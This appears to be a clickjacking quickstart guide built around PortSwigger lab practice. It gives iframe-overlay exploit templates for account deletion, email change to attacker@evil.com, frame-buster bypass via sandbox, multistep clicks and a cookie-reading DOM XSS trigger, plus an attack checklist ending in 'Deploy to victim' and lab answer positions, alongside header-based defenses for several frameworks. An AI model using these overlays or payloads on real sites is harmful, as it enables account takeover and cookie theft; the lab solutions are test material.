# Clickjacking Quickstart Guide

## What is Clickjacking?

**Clickjacking** (UI redressing) is an attack where users are tricked into clicking hidden content by interacting with visible decoy content. An invisible iframe overlays the target page using CSS opacity and positioning.

**Key Point:** CSRF tokens DON'T prevent clickjacking - the attack operates within a legitimate session context.

---

## Quick Vulnerability Check

### 1. Manual Test (30 seconds)

Create `test.html`:
```html
<iframe src="https://target.com/account" width="800" height="600"></iframe>
```

**Result:**
- ✅ **Vulnerable:** Page loads in iframe
- ❌ **Protected:** Blank frame or error

### 2. Check Headers (Command Line)

```bash
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
```

**Look for:**
- `X-Frame-Options: DENY` or `SAMEORIGIN`
- `Content-Security-Policy: frame-ancestors 'none'`

**Missing headers = Potentially Vulnerable**

---

## Basic Exploitation Template

### Standard Clickjacking Attack

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;          /* Use 0.1 for alignment, 0.0001 for final */
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;           /* Adjust to align with target button */
        left: 60px;           /* Adjust to align with target button */
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://target.com/account"></iframe>
```

### Exploitation Steps

1. **Set opacity: 0.1** (semi-transparent for alignment)
2. **Load in browser** and hover over "Click me"
3. **Adjust top/left** until cursor changes to pointer over button
4. **Change opacity: 0.0001** (nearly invisible)
5. **Deploy exploit**

---

## Common Attack Scenarios

### 1. Account Deletion / Email Change

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://target.com/my-account"></iframe>
```

### 2. Form Prepopulation (Email Change)

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
```

### 3. Bypassing Frame Busters

If page refuses to load due to frame-busting JavaScript:

```html
<iframe sandbox="allow-forms" src="https://target.com/account?email=attacker@evil.com"></iframe>
```

**Key:** `sandbox="allow-forms"` blocks JavaScript (disables frame buster) but allows form submission.

### 4. Multi-Step Clickjacking (Confirmations)

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick {
        position: absolute;
        top: 330px;
        left: 50px;
        z-index: 1;
    }
    .secondClick {
        position: absolute;
        top: 285px;
        left: 225px;
        z-index: 1;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://target.com/account"></iframe>
```

### 5. DOM XSS Trigger

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 600px;
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://target.com/feedback?name=<img src=x onerror=alert(document.cookie)>"></iframe>
```

---

## Defense Quick Reference

### Secure Configuration (Recommended)

**HTTP Headers:**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
```

**Session Cookie:**
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

### Implementation Examples

**Node.js/Express:**
```javascript
app.use((req, res, next) => {
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Content-Security-Policy', "frame-ancestors 'none';");
    next();
});
```

**Python/Flask:**
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "frame-ancestors 'none';"
    return response
```

**PHP:**
```php
header("X-Frame-Options: DENY");
header("Content-Security-Policy: frame-ancestors 'none';");
```

**Apache (.htaccess):**
```apache
Header always set X-Frame-Options "DENY"
Header always set Content-Security-Policy "frame-ancestors 'none';"
```

**Nginx:**
```nginx
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'none';" always;
```

---

## Testing Tools

### 1. Burp Suite Clickbandit

**Quick Usage:**
1. Burp menu → Burp Clickbandit
2. Copy script to clipboard
3. Open target page in browser
4. Paste script in console (F12)
5. Click "Record mode"
6. Perform actions on page
7. Click "Finish"
8. Save generated HTML

**Advantage:** Automatically generates aligned exploit code

### 2. OWASP ZAP

1. Configure browser proxy
2. Spider target site
3. Run Active Scan
4. Check for "Clickjacking" alerts (Medium severity)

### 3. Manual Browser Test

**Console Check:**
```javascript
// Run in DevTools console
if (window.self !== window.top) {
    console.log("Page is framed");
} else {
    console.log("Page is not framed");
}
```

---

## Common Mistakes

| Mistake | Issue | Solution |
|---------|-------|----------|
| `opacity: 0` | iframe becomes non-interactive | Use `opacity: 0.0001` |
| Wrong z-index | Decoy on top, can't click iframe | iframe must have higher z-index |
| Missing position | Elements won't align | Use `position: relative/absolute` |
| Testing = final | opacity 0.1 visible in attack | Change to 0.0001 before delivery |
| Forgetting sandbox | Frame buster blocks attack | Use `sandbox="allow-forms"` |

---

## CSS Properties Explained

```css
iframe {
    position: relative;      /* Enables positioning */
    opacity: 0.0001;        /* Nearly invisible (NOT 0!) */
    z-index: 2;             /* Higher = on top */
    width: 500px;           /* Match target page size */
    height: 700px;
}

.decoy {
    position: absolute;     /* Allows precise placement */
    top: 300px;            /* Vertical alignment */
    left: 60px;            /* Horizontal alignment */
    z-index: 1;            /* Lower = behind iframe */
}
```

---

## PortSwigger Labs Quick Solutions

### Lab 1: Basic CSRF Protected
- **Target:** Account deletion
- **Payload:** Standard overlay on "Delete account" button
- **Position:** top: 300px, left: 60px

### Lab 2: Prefilled Form Input
- **Target:** Email change
- **URL:** `?email=attacker@evil.com`
- **Position:** top: 400px, left: 80px

### Lab 3: Frame Buster Script
- **Technique:** `sandbox="allow-forms"`
- **URL:** `?email=attacker@evil.com`
- **Position:** top: 400px, left: 80px

### Lab 4: DOM XSS Trigger
- **Payload:** `?name=<img src=x onerror=print()>`
- **Target:** Feedback form submit
- **Position:** top: 600px, left: 80px

### Lab 5: Multistep
- **Clicks:** 2 (Delete + Confirmation)
- **Position 1:** top: 330px, left: 50px
- **Position 2:** top: 285px, left: 225px

---

## Protection Priorities

1. ✅ **Set X-Frame-Options: DENY** (or SAMEORIGIN)
2. ✅ **Set CSP frame-ancestors 'none'** (or 'self')
3. ✅ **Use SameSite=Strict cookies**
4. ✅ **Require re-auth for sensitive actions**
5. ✅ **Implement CSRF tokens** (defense in depth)
6. ❌ **Don't rely on JavaScript frame busters** (easily bypassed)

---

## One-Liner Cheat Sheet

```bash
# Check headers
curl -I https://target.com | grep -i "x-frame\|frame-ancestors"

# Basic test
echo '<iframe src="https://target.com"></iframe>' > test.html && open test.html

# Python header check
python3 -c "import requests; r=requests.get('https://target.com'); print('X-Frame-Options:', r.headers.get('X-Frame-Options', 'MISSING')); print('CSP:', r.headers.get('Content-Security-Policy', 'MISSING'))"
```

---

## Sandbox Attribute Reference

| Value | Effect | Use in Bypass |
|-------|--------|---------------|
| `sandbox=""` | Maximum restrictions | ❌ Blocks forms |
| `sandbox="allow-forms"` | Permits forms, blocks scripts | ✅ **Use this** |
| `sandbox="allow-scripts"` | Permits JavaScript | ❌ Enables frame buster |
| `sandbox="allow-top-navigation"` | Permits breakout | ❌ Enables frame buster |
| `sandbox="allow-same-origin"` | Same-origin treatment | ⚠️ Dangerous |

**Golden Rule:** Only use `allow-forms` to bypass frame busters while maintaining exploitation capability.

---

## Attack vs Defense Summary

### Attack Checklist
- [ ] Check if page loads in iframe
- [ ] Check for frame-busting scripts
- [ ] Test sandbox bypass if needed
- [ ] Identify target buttons/actions
- [ ] Create overlay with opacity 0.1
- [ ] Align decoy with target
- [ ] Change opacity to 0.0001
- [ ] Test exploitation
- [ ] Deploy to victim

### Defense Checklist
- [ ] X-Frame-Options header set
- [ ] CSP frame-ancestors directive set
- [ ] SameSite cookies configured
- [ ] Tested in real iframe
- [ ] Applied to ALL pages
- [ ] Verified in multiple browsers
- [ ] CI/CD header validation
- [ ] Security monitoring enabled

---

## Quick Reference URLs

- **PortSwigger Labs:** https://portswigger.net/web-security/all-labs#clickjacking
- **OWASP Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- **Burp Clickbandit:** https://portswigger.net/burp/documentation/desktop/tools/clickbandit
- **Full Guide:** See `clickjacking-portswigger-labs-complete.md` in same directory

---

**Practice:** PortSwigger Web Security Academy provides free labs for legal, ethical practice.
